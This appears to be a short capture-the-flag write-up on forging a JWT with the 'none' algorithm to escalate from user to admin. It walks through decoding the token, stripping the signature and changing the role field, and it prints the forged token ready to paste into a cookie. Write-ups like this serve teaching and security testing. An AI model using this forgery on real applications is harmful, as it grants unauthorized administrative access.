# Web Privilege Escalation Time invasion

Upon logging in with the demo credentials, we received a JWT token in the browser cookies:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNzUzMTk2MjYzODgzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTM4LjAuMC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3NTMxOTYyNjR9.KMUFsIDTnFmyG3nMiGM6H9FNFUROf3wh7SmqJp-QV30
```

We decoded the JWT using https://token.dev and saw that the role field was set to "user".

We exploited a common misconfiguration where the server accepts tokens with the algorithm "none", meaning no signature is required. This allows us to forge a new JWT without knowing the secret key.

- Go to https://token.dev and paste the original JWT.
- Change the algorithm to "none".
- Edit the payload and change "role": "user" to "role": "admin".

The new forged JWT looks like this:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzUzMTk2MjYzODgzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTM4LjAuMC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzUzMTk2MjY0fQ
```

To apply the token, we edited our browser cookies, replacing the old JWT with our forged one.

!!! Important: We added a trailing dot (.) to signal the end of the token due to the missing signature part:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzUzMTk2MjYzODgzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTM4LjAuMC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzUzMTk2MjY0fQ.
```
